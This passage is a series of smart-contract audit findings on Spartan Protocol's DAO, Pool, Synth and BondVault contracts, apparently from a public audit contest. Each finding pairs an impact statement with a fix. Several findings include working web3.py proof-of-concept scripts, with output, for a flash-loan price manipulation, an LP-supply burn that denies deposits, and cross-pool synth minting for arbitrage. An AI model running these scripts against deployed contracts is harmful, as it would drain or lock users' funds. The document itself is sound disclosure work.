# Handle  hickuphh3   # Vulnerability details  ### Impact  - `calcClaimBondedLP()` returns `_BONDVAULT.calcBondedLP(()` which is a view function. Hence, `calcClaimBondedLP()` can be a view function as well. - `hasMinority()` is not called within the contract. Hence, the `public` keyword can be reduced to `external` to save gas.  ### Recommended Mitigation Steps  - Restrict `calcClaimBondedLP()` visibility to `view` (ie. add `view` keyword). - Reduce `hasMinority()` from `public` to `external`  
# Handle  hickuphh3   # Vulnerability details  ### Impact  `_handleTransferIn()`, `DEPLOYER` and `onlyDAO()` are defined but unused. Hence, they can be removed from the contract.  
# Handle  hickuphh3   # Vulnerability details  ### Impact  The `swapTo()` function should not be payable since the WBNB-SPARTA pool should not receive BNB, but WBNB. The router swap functions handles the wrapping and unwrapping of BNB.  Furthermore, the `swapTo()` will not detect any deposited BNB, so any swapTo() calls that have msg.value > 0 will have their BNB permanently locked in the pool contract.   ### Recommended Mitigation Steps  Remove `payable` keyword in `swapTo()`.  
# Handle  hickuphh3   # Vulnerability details  ### Impact  `depositLPForMember()` and `bond()` invokes `harvest()` if a user has existing LP deposits or bonded assets into the DAO. This is to prevent users from depositing more assets before calling `harvest()` to earn more DAOVault incentives. However, `harvest()` reverts if reserve emissions are turned off.   Hence, deposits / bonds performed by existing users will fail should reserve emissions be disabled.  ### Recommended Mitigation Steps  Cache claimable rewards into a separate mapping when `depositLPForMember()` and `bond()` are called. `harvest()` will then attempt to claim these cached + pending rewards. Perhaps Synthetix's Staking Rewards contract or Sushiswap's FairLaunch contract can provide some inspiration.  
# Handle  hickuphh3   # Vulnerability details  ### Impact  In general, creating invalid proposals is easy due to the lack of validation in the `new*Proposal()` functions.  - The `typeStr` is not validated at all. For example, one can call `newActionProposal()` with `typeStr = ROUTER` or `typeStr = BAD_STRING`, both of which will pass. The first will cause `finaliseProposal()` to fail because the proposed address is null, preventing `completeProposal()` from executing. The second does nothing because it does not equate to any of the check `typeStr`, and so `completeProposal()` isn't executed at all. - Not checking the proposed values are null. The checks only happen in `finaliseProposal()` when the relevant sub-functions are called, like the `move*()` functions.  All of these scenarios lead to a mandatory 15 day wait since proposal creation in order to be cancelled, which prevents the creation of new proposals (in order words, denial of service of the DAO).  ### Recommended Mitigation Steps  1. Since the number of proposal types is finite, it is best to restrict and validate the `typeStr` submitted. Specifically,     - `newActionProposal()` should only allow `FLIP_EMISSIONS` and `GET_SPARTA` proposal types     - `newAddressProposal()` should only allow `DAO`, `ROUTER`, `UTILS`, `RESERVE`, `LIST_BOND`, `DELIST_BOND`, `ADD_CURATED_POOL` and  `REMOVE_CURATED_POOL` proposal types     - `newParamProposal()` should only allow `COOL_OFF` and `ERAS_TO_EARN` proposal types 2. Perhaps have a "catch-all-else" proposal that will only call `_completeProposal()` in `finaliseProposal()`  ```jsx function finaliseProposal() external {  ...  } else if (isEqual(_type, 'ADD_CURATED_POOL')){   _addCuratedPool(currentProposal);   } else if (isEqual(_type, 'REMOVE_CURATED_POOL')){     _removeCuratedPool(currentProposal);   } else {   completeProposal(_proposalID);  } } ```  3. Do null validation checks in `newAddressProposal()` and `newParamProposal()`  ```jsx function newAddressProposal(address proposedAddress, string memory typeStr) external returns(uint) {     require(proposedAddress != address(0), "!address");   // TODO: validate typeStr   ... }  function newParamProposal(uint32 param, string memory typeStr) external returns(uint) {     require(param != 0, "!param");   // TODO: validate typeStr   ... } ```  
# Handle  hickuphh3   # Vulnerability details  ### Impact  A host of problems arise from the L110-113 of the `claimForMember()` function, where `_claimable` is deducted from the bondedLP balance before the condition check, when it should be performed after (or the condition is changed to checking if the remaining bondedLP balance to zero).  ```jsx // L110 - L113 mapBondAsset_memberDetails[asset].bondedLP[member] -= _claimable; // Remove the claim amount from the user's remainder if(_claimable == mapBondAsset_memberDetails[asset].bondedLP[member]){  mapBondAsset_memberDetails[asset].claimRate[member] = 0; // If final claim; zero-out their claimRate } ```  **1. Permanently Locked Funds**  If a user claims his bonded LP asset by calling `dao.claimForMember()`, or a malicious attacker helps a user to claim by calling `dao.claimAllForMember()`, either which is done such that `_claimable` is exactly half of his remaining bondedLP funds of an asset, then the other half would be permanently locked.  - Assume `mapBondAsset_memberDetails[asset].bondedLP[member] = 2 * _claimable` - L110: `mapBondAsset_memberDetails[asset].bondedLP[member] = _claimable` - L111: The if condition is satisfied - L112: User's claimRate is erroneously set to 0 ⇒ `calcBondedLP()` will return 0, ie. funds are locked permanently  **2. Claim Rate Never Zeroes For Final Claim**   On the flip side, should a user perform a claim that enables him to perform a full withdrawal (ie. `_claimable` = `mapBondAsset_memberDetails[asset].bondedLP[member]`, we see the following effects:  - L110: `mapBondAsset_memberDetails[asset].bondedLP[member] = 0` - L111: The if condition is not satisfied, L112 does not execute, so the member's claimRate for the asset remains non-zero (it is expected to have been set to zero).  Thankfully, subsequent behaviour remains as expected since `calcBondedLP` returns zero as `claimAmount` is set to the member's bondedLP balance (which is zero after a full withdrawal).  ### Recommended Mitigation Steps  The `_claimable` deduction should occur after the condition check. Alternatively, change the condition check to `if (mapBondAsset_memberDetails[asset].bondedLP[member] == 0)`.  
# Handle  jonah1005   # Vulnerability details  ## Impact Synth `realise` function calculates `baseValueLP` and `baseValueSynth` base on AMM spot price which is vulnerable to flash loan attack. Synth's lp is subject to `realise` whenever the AMM ratio is different than Synth's debt ratio.   The attack is not necessarily required flash loan. Big whale of the lp token holders could keep calling realse by shifting token ratio of AMM pool back and forth.   ## Proof of Concept The vulnerability locates at: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L187-L199  Where the formula here is dangerous: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L114-L126  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L210-L217 Here's a script for conducting flashloan attack ```python flashloan_amount = init_amount user = w3.eth.accounts[0] marked_token.functions.transfer(user, flashloan_amount).transact() marked_token.functions.transfer(token_pool.address, flashloan_amount).transact({'from': user}) token_pool.functions.addForMember(user).transact({'from': user}) received_lp = token_pool.functions.balanceOf(user).call()  synth_balance_before_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call() token_synth.functions.realise(token_pool.address).transact() token_pool.functions.transfer(token_pool.address, received_lp).transact({'from': user}) token_pool.functions.removeForMember(user).transact({'from': user}) token_synth.functions.realise(token_pool.address).transact() synth_balance_after_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call() print('synth_lp_balance_after_realise', synth_balance_after_realise) print('synth_lp_balance_before_realise', synth_balance_before_realise)  ``` Output: ``` synth_balance_after_realise 1317859964829313908162 synth_balance_before_realise 2063953488372093023256 ``` ## Tools Used None  ## Recommended Mitigation Steps Calculating Lp token's value base on AMM protocol is known to be dangerous. There are a few steps that might solve the issue: 1. calculate token's price from a reliable source.  Implement a TWAP oracle or uses chainlink oracle. 2. calculate lp token value based on anti-flashloan formula.  Alpha finance's formula is a good reference: https://blog.alphafinance.io/fair-lp-token-pricing   
# Handle  jonah1005   # Vulnerability details  ## Impact  `Pool` allows users to burn lp tokens without withdrawing the tokens. This allows the hacker to mutate the pools' rate to a point that no one can get any lp token anymore (even if depositing token).  The liquidity tokens are calculated at `Utils:calcLiquidityUnits` ```             // units = ((P (t B + T b))/(2 T B)) * slipAdjustment             // P * (part1 + part2) / (part3) * slipAdjustment             uint slipAdjustment = getSlipAdustment(b, B, t, T);             uint part1 = t*(B);             uint part2 = T*(b);             uint part3 = T*(B)*(2);             uint _units = (P * (part1 + (part2))) / (part3);             return _units * slipAdjustment / one;  // Divide by 10**18 ``` where `P` stands for `totalSupply` of current Pool. If `P` is too small (e.g, 1) then all the units would be rounding to 0.  Since any person can create a `Pool` at `PoolFactory`, hackers can create a Pool and burn his lp and set `totalSupply` to 1. He will be the only person who owns the Pool's lp from now on.  ## Proof of Concept Pool's burn logic: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L146  Utils' lp token formula: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L80  Here's a script of a user depositing 1M token to a pool where `totalSupply` equals 1  ``` dai_pool.functions.burn(init_amount-1).transact() print('total supply', dai_pool.functions.totalSupply().call()) dai.functions.transfer(dai_pool.address, 1000000 * 10**18).transact() dai_pool.functions.addForMember(user).transact() print('lp received from depositing 1M dai: ', dai_pool.functions.balanceOf(user).call()) ```  Output: ``` total supply 1 lp received from depositing 1M dai:  0 ``` ## Tools Used None ## Recommended Mitigation Steps Remove `burn` or restrict it to privileged users only.   
# Handle  hickuphh3   # Vulnerability details  ### Impact  The `claimAllForMember()` function iterates through the full list of `listedAssets`. Should `listedAssets` become too large, as more assets are listed, calling this function will run out of gas and fail.  ### Recommended Mitigation Steps  A good compromise would be to take in an array of asset indexes, so that users can claim for multiple assets in multiple parts.  ```jsx function claimAllForMember(address member, uint256[] calldata assetIndexes)  external returns (bool){         address [] memory listedAssets = listedBondAssets; // Get array of bond assets         for(uint i = 0; i < assetIndexes.length; i++){             uint claimA = calcClaimBondedLP(member, listedAssets[assetIndexes[i]]); // Check user's unlocked Bonded LPs for each asset             if(claimA > 0){                _BONDVAULT.claimForMember(listedAssets[assetIndexes[i]], member); // Claim LPs if any unlocked             }         }         return true;     } ```  
# Handle  hickuphh3   # Vulnerability details  ### Impact  In the case where `arrayFeeLength < arrayFeeSize`, totalTradeFees is not calculated, so normalAverageFee will be 0. Hence, a return statement can be added to exit the function. Otherwise, when `arrayFeeSize >= arrayFeeLength`, the feeArray elements are iterated through twice:  - First, in `addFee`, to shift the elements by 1 to make way for the new fee. Note that `addFee()` is also solely called by `addTradeFee()` - Second, for the calculation of totalTradeFees  With all these in mind, we can make the second iteration redundant by combining the total trade fee calculation in `addFee()`.  ### Recommended Mitigation Steps  ```jsx function addTradeFee(uint _fee) internal {  uint arrayFeeLength = feeArray.length;   if(arrayFeeLength < arrayFeeSize){   feeArray.push(_fee); // Build array until it is == arrayFeeSize     return;    }   // If array is required length; shift in place of oldest item   // Calculate totalTradeFee at the same time   uint totalTradeFees = addCurrentFeeAndCalcTotalTradeFees(arrayFeeLength, _fee);    normalAverageFee = totalTradeFees / arrayFeeSize; // Calc average fee }  function addCurrentFeeAndCalcTotalTradeFees(   uint arrayFeeLength,  uint _fee ) internal returns (uint totalTradeFees) {  totalTradeFees = _fee; // add newest fee   // store and update in memory first, for gas optimization   uint[] memory _feeArray = feeArray;   for (uint i = arrayFeeLength - 1; i > 0; i--) {   _feeArray[i] = _feeArray[i - 1];     totalTradeFees += _feeArray[i];   }   _feeArray[0] = _fee;   feeArray = _feeArray; } ```  
# Handle  hickuphh3   # Vulnerability details  ### Impact  The current `changeArrayFeeSize` implementation deletes the entire feeArray (which is used to calculate normalAverageFee for dividends), resulting in having to rebuild the feeArray again.  It would be better to keep the feeArray as is if the `_size` is greater than the current feeArrayLength, or trim it otherwise, so that the calculation `normalAverageFee` has past trade fees to use and is therefore more accurate.  ### Recommended Mitigation Steps  ```jsx function changeArrayFeeSize(uint _size) external onlyDAO {  arrayFeeSize = _size;   // trim feeArray to match _size   if (_size < feeArray.length) {      uint[] memory tempFeeArray = new uint[](_size);      // copy feeArray for gas optimization      uint[] memory _feeArray = feeArray;    for (uint i = 0; i < _size; i++) {         tempFeeArray[i] = _feeArray[i];    }      feeArray = tempFeeArray;  }   // otherwise, keep feeArray unchanged } ```  
# Handle  hickuphh3   # Vulnerability details  ### Impact  For minting, burning of synths and swaps, the fee and output amounts are calculated separately via `calcSwapOutput` and `calcSwapFee`. To avoid rounding errors and duplicate calculations, it would be best to combine both of these functions and return both outputs at once.  For example, if we take `x = 60000, X = 73500, Y = 50321`, the actual swap fee should be `10164.57` and output `12451.6`. However, `calcSwapOutput` and `calcSwapFee` returns `10164` and `12451`, leaving 1 wei unaccounted for. This can be avoided by combining the calculations as suggested below. The fee and actual output will be `10164` and `12452` instead.  Functions that have to call `calcSwapOutput` within the contract (eg. `calcSwapValueInBaseWithPool`) should call this function as well, for calculation consistency.  In addition, calculations for both `calcSwapOutput` and `calcSwapFee` will phantom overflow if the input values become too large. (Eg. `x = 2^128, Y=2^128`). This can be avoided by the suggested implementation below using the FullMath library.  ### Recommended Mitigation Steps  ```jsx function calcSwapFeeAndOutput(uint x, uint X, uint Y) public pure returns (uint output, uint swapFee) {      uint xAddX = x + X;      uint rawOutput = FullMath.mulDiv(x, Y, xAddX);      swapFee = FullMath.mulDiv(rawOutput, x, xAddX);      output = rawOutput - swapFee; }  function calcSwapValueInBaseWithPool(address pool, uint amount) public view returns (uint _output){        uint _baseAmount = iPOOL(pool).baseAmount();        uint _tokenAmount = iPOOL(pool).tokenAmount();        (_output, ) = calcSwapFeeAndOutput(amount, _tokenAmount, _baseAmount); } ```  The FullMath library is included (and made compatible with sol 0.8+) below for convenience.  ```jsx // SPDX-License-Identifier: MIT pragma solidity >= 0.8.0;  /// @title Contains 512-bit math functions /// @notice Facilitates multiplication and division that can have overflow of an intermediate value without any loss of precision /// @dev Handles "phantom overflow" i.e., allows multiplication and division where an intermediate value overflows 256 bits library FullMath {     /// @notice Calculates floor(a×b÷denominator) with full precision. Throws if result overflows a uint256 or denominator == 0     /// @param a The multiplicand     /// @param b The multiplier     /// @param denominator The divisor     /// @return result The 256-bit result     /// @dev Credit to Remco Bloemen under MIT license https://xn--2-umb.com/21/muldiv     function mulDiv(         uint256 a,         uint256 b,         uint256 denominator     ) internal pure returns (uint256 result) {         // 512-bit multiply [prod1 prod0] = a * b         // Compute the product mod 2**256 and mod 2**256 - 1         // then use the Chinese Remainder Theorem to reconstruct         // the 512 bit result. The result is stored in two 256         // variables such that product = prod1 * 2**256 + prod0         uint256 prod0; // Least significant 256 bits of the product         uint256 prod1; // Most significant 256 bits of the product         assembly {             let mm := mulmod(a, b, not(0))             prod0 := mul(a, b)             prod1 := sub(sub(mm, prod0), lt(mm, prod0))         }          // Handle non-overflow cases, 256 by 256 division         if (prod1 == 0) {             require(denominator > 0, "0 denom");             assembly {                 result := div(prod0, denominator)             }             return result;         }          // Make sure the result is less than 2**256.         // Also prevents denominator == 0         require(denominator > prod1, "denom <= prod1");          ///////////////////////////////////////////////         // 512 by 256 division.         ///////////////////////////////////////////////          // Make division exact by subtracting the remainder from [prod1 prod0]         // Compute remainder using mulmod         uint256 remainder;         assembly {             remainder := mulmod(a, b, denominator)         }         // Subtract 256 bit number from 512 bit number         assembly {             prod1 := sub(prod1, gt(remainder, prod0))             prod0 := sub(prod0, remainder)         }          // Factor powers of two out of denominator         // Compute largest power of two divisor of denominator.         // Always >= 1.         uint256 twos = denominator & (~denominator + 1);         // Divide denominator by power of two         assembly {             denominator := div(denominator, twos)         }          // Divide [prod1 prod0] by the factors of two         assembly {             prod0 := div(prod0, twos)         }         // Shift in bits from prod1 into prod0. For this we need         // to flip `twos` such that it is 2**256 / twos.         // If twos is zero, then it becomes one         assembly {             twos := add(div(sub(0, twos), twos), 1)         }         unchecked {             prod0 |= prod1 * twos;                          // Invert denominator mod 2**256             // Now that denominator is an odd number, it has an inverse             // modulo 2**256 such that denominator * inv = 1 mod 2**256.             // Compute the inverse by starting with a seed that is correct             // correct for four bits. That is, denominator * inv = 1 mod 2**4             uint256 inv = (3 * denominator) ^ 2;                          // Now use Newton-Raphson iteration to improve the precision.             // Thanks to Hensel's lifting lemma, this also works in modular             // arithmetic, doubling the correct bits in each step.             inv *= 2 - denominator * inv; // inverse mod 2**8             inv *= 2 - denominator * inv; // inverse mod 2**16             inv *= 2 - denominator * inv; // inverse mod 2**32             inv *= 2 - denominator * inv; // inverse mod 2**64             inv *= 2 - denominator * inv; // inverse mod 2**128             inv *= 2 - denominator * inv; // inverse mod 2**256                          // Because the division is now exact we can divide by multiplying             // with the modular inverse of denominator. This will give us the             // correct result modulo 2**256. Since the precoditions guarantee             // that the outcome is less than 2**256, this is the final result.             // We don't need to compute the high bits of the result and prod1             // is no longer required.             result = prod0 * inv;         }         return result;     } } ```  
# Handle  jonah1005   # Vulnerability details  ## Impact `approveAndCall` approve max allowance to the receiver regardless of the given parameter.  This is far away from what the function name implies. Users would lose all the tokens by using this function.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L118 https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L113 ## Tools Used None ## Recommended Mitigation Steps Change to `_approve(msg.sender, recipient, amount); `  
# Handle  jonah1005   # Vulnerability details  ## Impact https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L46  The comment at `poolFactory` L46  is a bit misleading. ``` require(getPool(token) == address(0)); // Must be a valid token ```  A similar checks in `synthFactory` seems to be more clear. https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthFactory.sol#L38  ```         require(getSynth(token) == address(0), "exists"); // Synth must not already exist ```  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L46 ## Tools Used None ## Recommended Mitigation Steps  It seems that `PoolFactory` is the only contract that does not provide detailed revert messages. I wonder whether the devs do this because of the concern about the code size limit. If that's the case, I recommend refactoring it to libraries or even uses a proxy factory to create new pools.   Ref to proxy factory:  https://eips.ethereum.org/EIPS/eip-1167  
# Handle  hickuphh3   # Vulnerability details  ### Impact  In the `_approve` function, if the allowance passed in is `type(uint256).max`, nothing happens (ie. allowance will still remain at previous value). Contract integrations (DEXes for example) tend to hardcode this value to set maximum allowance initially, but this will result in zero allowance given instead.  This also makes the comment `// No need to re-approve if already max` misleading, because the max allowance attainable is `type(uint256).max - 1`, and re-approval does happen in this case.  This affects the `approveAndCall` implementation since it uses `type(uint256).max` as the allowance amount, but the resulting allowance set is zero.  ### Recommended Mitigation Steps  Keep it simple, remove the condition.  ```jsx function _approve(address owner, address spender, uint256 amount) internal virtual {         require(owner != address(0), "!owner");         require(spender != address(0), "!spender");         _allowances[owner][spender] = amount;         emit Approval(owner, spender, amount);     } ```  
# Handle  hickuphh3   # Vulnerability details  ### Impact  2 conditions enable the `DEPLOYER` to drain the funds in the DAOVault.  - `DAOVault` is missing `purgeDeployer()` function - `onlyDAO()` is callable by both the `DAO` and the `DEPLOYER`  The `DEPLOYER` can, at any time, call `depositLP()` to increase the LP funds of any account, then call `withdraw()` to withdraw the entire balance.  The only good use case for the `DEPLOYER` here is to help perform emergency withdrawals for users. However, this could use a separate modifier, like `onlyDeployer()`.  ### Proof of Concept  1. `DEPLOYER` calls `depositLP()` with any arbitrary amount (maybe DAOVault's pool LP balance - Alice's deposited LP balance) for Alice and pool to increase their weight and balance. 2. At this point, Alice may vote for a proposal to swing it in her favour, or remove it otherwise (to implicitly vote against it) 3. `DEPLOYER` calls `withdraw()` for the Alice, which removes 100% of her balance (and therefore, the entire DAOVault's pool balance)  ### Recommended Mitigation Steps  - Create a separate role and modifier for the `DEPLOYER`, so that he is only able to call `withdraw()` but not `depositLP()` - Include the missing `purgeDeployer()` function.  
# Handle  gpersoon   # Vulnerability details  ## Impact The function depositForMember of BondVault.sol adds user to the array arrayMembers. However it does this for each asset that a user deposits. Suppose a user deposit multiple assets, than the user is added multiple times to the array arrayMembers.  This will mean the memberCount() doesn't show accurate results. Also allMembers() will contain duplicate members  ## Proof of Concept // https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/BondVault.sol#L60 function depositForMember(address asset, address member, uint LPS) external onlyDAO returns(bool){         if(!mapBondAsset_memberDetails[asset].isMember[member]){             mapBondAsset_memberDetails[asset].isMember[member] = true; // Register user as member (scope: user -> asset)             arrayMembers.push(member); // Add user to member array (scope: vault)             mapBondAsset_memberDetails[asset].members.push(member); // Add user to member array (scope: user -> asset)         }        ...      // Get the total count of all existing & past BondVault members     function memberCount() external view returns (uint256 count){         return arrayMembers.length;     }     function allMembers() external view returns (address[] memory _allMembers){         return arrayMembers;     }  ## Tools Used  ## Recommended Mitigation Steps Use a construction like this: mapping(address => bool) isMember;    if(!isMember[member]){             isMember[member] = true;             arrayMembers.push(member);     }               
# Handle  jonah1005   # Vulnerability details  ## Impact `Pool` can mint arbitrary `Sythn` provided as long as it's a valid synth. When there are multiple curated pools and synth (which the protocol is designed for), hackers can mint expensive synthetics from a cheaper AMM pool. The hacker can burn the minted synth at the expensive pool and get profit. The arbitrage profit can be amplified with flash loan services and break all the pegs.  ## Proof of Concept Pool's mintSynth logic: https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L229-L242  Synth's mintSynth logic: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L165-L171  Synth's authorization logic: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L229-L242   The price of the synthetics to be mint is calculated in `Pool` based on the AMM price of the current Pool   Here's a web3.py script of minting arbitrary Synth in a pool. For simplicity, two pools are set with the assumption that link is 10x expensive than dai.  ```python sparta_amount = 100 * 10**18 initail_link_synth = link_synth.functions.balanceOf(user).call() base.functions.transfer(link_pool.address, sparta_amount).transact({'from': user}) link_pool.functions.mintSynth(link_synth.address, user).transact({'from': user}) after_link_synth = link_synth.functions.balanceOf(user).call()  print('get link synth amount from link pool:', after_link_synth - initail_link_synth)  sparta_amount = 100 * 10**18 initail_link_synth = link_synth.functions.balanceOf(user).call() base.functions.transfer(dai_pool.address, sparta_amount).transact({'from': user}) dai_pool.functions.mintSynth(link_synth.address, user).transact({'from': user}) after_link_synth = link_synth.functions.balanceOf(user).call()  print('get link synth amount from dai pool:', after_link_synth - initail_link_synth)  ```  The log of the above script ``` get link synth amount from link pool: 97078046905036524413 get link synth amount from dai pool: 970780469050365244136 ``` ## Tools Used  Hardhat  ## Recommended Mitigation Steps Checks the provided synth's underlying token in `mintSynth`  `require(iSYNTH(synthOut).LayerONE() == TOKEN, "invalid synth");`    
# Handle  gpersoon   # Vulnerability details  ## Impact When the DAO is upgraded via moveDao, it also updates the DAO address in BASE. However it doesn't update the DAO address in the Reserve.sol contract. This could be done with the function setIncentiveAddresses(..)  Now the next time grantFunds of DAO.sol is called, its tries to call:  _RESERVE.grantFunds(...)  The grantFunds of Reserve.sol has the modifier onlyGrantor(), which checks the msg.sender == DAO. However in the mean time the DAO has been updated and Reserve.sol doesn't know about it and thus the modifier will not allow access to the function. Thus grantFunds will revert.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L452  function moveDao(uint _proposalID) internal {         address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address         require(_proposedAddress != address(0), "!address"); // Proposed address must be valid         DAO = _proposedAddress; // Change the DAO to point to the new DAO address         iBASE(BASE).changeDAO(_proposedAddress); // Change the BASE contract to point to the new DAO address         daoHasMoved = true; // Set status of this old DAO         completeProposal(_proposalID); // Finalise the proposal     }      function grantFunds(uint _proposalID) internal {         uint256 _proposedAmount = mapPID_param[_proposalID]; // Get the proposed SPARTA grant amount         address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed SPARTA grant recipient         require(_proposedAmount != 0, "!param"); // Proposed grant amount must be valid         require(_proposedAddress != address(0), "!address"); // Proposed recipient must be valid         _RESERVE.grantFunds(_proposedAmount, _proposedAddress); // Grant the funds to the recipient         completeProposal(_proposalID); // Finalise the proposal     }  // https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/outside-scope/Reserve.sol#L17   modifier onlyGrantor() {         require(msg.sender == DAO || msg.sender == ROUTER || msg.sender == DEPLOYER || msg.sender == LEND || msg.sender == SYNTHVAULT, "!DAO");         _;      }    function grantFunds(uint amount, address to) external onlyGrantor {       ....     }     function setIncentiveAddresses(address _router, address _lend, address _synthVault, address _Dao) external onlyGrantor {         ROUTER = _router;         LEND = _lend;         SYNTHVAULT = _synthVault;         DAO = _Dao;     }   ## Tools Used  ## Recommended Mitigation Steps Call setIncentiveAddresses(..) when a DAO upgrade is done.   
# Handle  gpersoon   # Vulnerability details  ## Impact A call to transferFrom or transfer is frequently done without checking the results. For certain ERC20 tokens, if insufficient tokens are present, no revert occurs but a result of "false" is returned. So its important to check this. If you don't you could mint tokens without have received sufficient tokens to do so. So you could loose funds.  Its also a best practice to check this. See below for example where the result isn't checked.  Note, in some occasions the result is checked (see below for examples).  ## Proof of Concept Highest risk: .\Dao.sol:                iBEP20(_token).transferFrom(msg.sender, address(this), _amount); // Transfer user's assets to Dao contract .\Pool.sol:               iBEP20(TOKEN).transfer(member, outputToken); // Transfer the TOKENs to user .\Pool.sol:               iBEP20(token).transfer(member, outputAmount); // Transfer the swap output to the selected user .\poolFactory.sol:   iBEP20(_token).transferFrom(msg.sender, _pool, _amount); .\Router.sol:           iBEP20(_fromToken).transfer(fromPool, iBEP20(_fromToken).balanceOf(address(this))); // Transfer TOKENs from ROUTER to fromPool .\Router.sol:           iBEP20(_token).transfer(_pool, iBEP20(_token).balanceOf(address(this))); // Transfer TOKEN to pool .\Router.sol:           iBEP20(_token).transferFrom(msg.sender, _pool, _amount); // Transfer TOKEN to pool .\Router.sol:           iBEP20(_token).transfer(_recipient, _amount); // Transfer TOKEN to recipient .\Synth.sol:             iBEP20(_token).transferFrom(msg.sender, address(this), _amount); // Transfer tokens in  less risky .\Router.sol:           iBEP20(fromPool).transferFrom(_member, fromPool, unitsInput); // Transfer LPs from user to the pool .\BondVault.sol:     iBEP20(_pool).transfer(member, _claimable); // Send claim amount to user .\Router.sol:           iBEP20(_pool).transferFrom(_member, _pool, units); // Transfer LPs to the pool .\Router.sol:           iBEP20(_pool).transferFrom(_member, _pool, units); // Transfer LPs to pool .\Router.sol:           iBEP20(fromSynth).transferFrom(msg.sender, _poolIN, inputAmount); // Transfer synth from user to pool .\Pool.sol:               iBEP20(synthIN).transfer(synthIN, _actualInputSynth); // Transfer SYNTH to relevant synth contract .\Router.sol:           iBEP20(WBNB).transfer(_pool, _amount); // Transfer WBNB from ROUTER to pool .\Dao.sol:               iBEP20(BASE).transfer(newDAO, baseBal); .\Pool.sol:               iBEP20(BASE).transfer(member, outputBase); // Transfer the SPARTA to user .\Pool.sol:               iBEP20(BASE).transfer(member, outputBase); // Transfer SPARTA to user .\Router.sol:           iBEP20(BASE).transfer(toPool, iBEP20(BASE).balanceOf(address(this))); // Transfer SPARTA from ROUTER to toPool .\Router.sol:           iBEP20(BASE).transfer(_pool, iBEP20(BASE).balanceOf(address(this))); // Transfer SPARTA to pool .\Router.sol:           iBEP20(BASE).transfer(_pool, iBEP20(BASE).balanceOf(address(this))); // Transfer SPARTA from ROUTER to pool .\Router.sol:           iBEP20(BASE).transferFrom(msg.sender, _pool, inputAmount); // Transfer SPARTA from ROUTER to pool  Sometimes the result is checked: .\Dao.sol:              require(iBEP20(pool).transferFrom(msg.sender, address(_DAOVAULT), amount), "!funds"); // Send user's deposit to the DAOVault .\Dao.sol:              require(iBEP20(BASE).transferFrom(msg.sender, address(_RESERVE), _amount), '!fee'); // User pays the new proposal fee .\DaoVault.sol:      require(iBEP20(pool).transfer(member, _balance), "!transfer"); // Transfer user's balance to their wallet .\synthVault.sol:    require(iBEP20(synth).transferFrom(msg.sender, address(this), amount)); // Must successfuly transfer in .\synthVault.sol:    require(iBEP20(synth).transfer(msg.sender, redeemedAmount)); // Transfer from SynthVault to user  ## Tools Used grep  ## Recommended Mitigation Steps Always check the result of transferFrom and transfer   
# Handle  gpersoon   # Vulnerability details  ## Impact The function curatedPoolCount() contains a for loop over the array arrayPools. If arrayPools would be too big then the loop would run out of gas and curatedPoolCount() would revert. This would mean that addCuratedPool() cannot be executed anymore (because it calls curatedPoolCount() )  The array arrayPools can be increased in size arbitrarily by repeatedly doing the following: - create a pool with createPoolADD()  (which requires 10,000 SPARTA) - empty the pool with remove() of Pool.sol, which gives back the SPARTA tokens These actions will use gas to perform.  ## Proof of Concept //https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/poolFactory.sol#L45  function createPoolADD(uint256 inputBase, uint256 inputToken, address token) external payable returns(address pool){         require(getPool(token) == address(0)); // Must be a valid token         require((inputToken > 0 && inputBase >= (10000*10**18)), "!min"); // User must add at least 10,000 SPARTA liquidity & ratio must be finite         Pool newPool; address _token = token;         if(token == address(0)){_token = WBNB;} // Handle BNB -> WBNB         require(_token != BASE && iBEP20(_token).decimals() == 18); // Token must not be SPARTA & it's decimals must be 18         newPool = new Pool(BASE, _token); // Deploy new pool         pool = address(newPool); // Get address of new pool         mapToken_Pool[_token] = pool; // Record the new pool address in PoolFactory         _handleTransferIn(BASE, inputBase, pool); // Transfer SPARTA liquidity to new pool         _handleTransferIn(token, inputToken, pool); // Transfer TOKEN liquidity to new pool         arrayPools.push(pool); // Add pool address to the pool array        ..  function curatedPoolCount() internal view returns (uint){         uint cPoolCount;          for(uint i = 0; i< arrayPools.length; i++){             if(isCuratedPool[arrayPools[i]] == true){                 cPoolCount += 1;             }         }         return cPoolCount;     }   function addCuratedPool(address token) external onlyDAO {         ...         require(curatedPoolCount() < curatedPoolSize, "maxCurated"); // Must be room in the Curated list  //https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L187   function remove() external returns (uint outputBase, uint outputToken) {         return removeForMember(msg.sender);     }       // Contract removes liquidity for the user     function removeForMember(address member) public returns (uint outputBase, uint outputToken) {         uint256 _actualInputUnits = balanceOf(address(this)); // Get the received LP units amount         outputBase = 